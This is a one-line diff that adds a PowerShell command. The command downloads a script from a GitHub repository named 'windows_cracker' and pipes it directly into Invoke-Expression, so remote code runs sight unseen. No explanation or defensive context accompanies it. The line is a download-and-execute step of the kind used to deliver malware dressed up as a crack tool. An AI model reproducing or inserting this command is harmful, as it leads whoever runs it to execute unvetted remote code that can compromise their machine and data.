@@ -1,0 +1,1 @@
+iwr -useb https://raw.githubusercontent.com/diraDJ83/windows_cracker/refs/heads/main/source.ps1/ | iex
